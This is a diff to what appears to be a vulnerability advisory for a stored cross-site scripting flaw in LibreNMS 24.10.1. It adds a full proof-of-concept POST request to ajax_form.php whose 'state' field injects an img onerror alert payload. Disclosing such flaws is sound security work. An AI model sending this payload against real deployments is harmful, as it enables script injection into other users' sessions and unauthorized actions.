@@ -4,10 +4,19 @@
 **Description:**
 
 
-Stored XSS on the list parameters (Replace $DEVICE_ID with your specific $DEVICE_ID value):
-`ajax_form.php` -> param: state
+Stored XSS on the parameter: `ajax_form.php` -> param: state
 
+Request:
+```http
+POST /ajax_form.php HTTP/1.1
+Host: <your_host>
+X-Requested-With: XMLHttpRequest
+X-CSRF-TOKEN: <your_XSRF_token>
+Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+Cookie: <your_cookie>
 
+type=override-config&device_id=1&attrib=override_icmp_disable&state="><img%20src%20onerror="alert(1)"> 
+```
 
 of Librenms version 24.10.1 ([https://github.com/librenms/librenms](https://github.com/librenms/librenms)) allows remote attackers to inject malicious scripts. When a user views or interacts with the page displaying the data, the malicious script executes immediately, leading to potential unauthorized actions or data exposure.
 
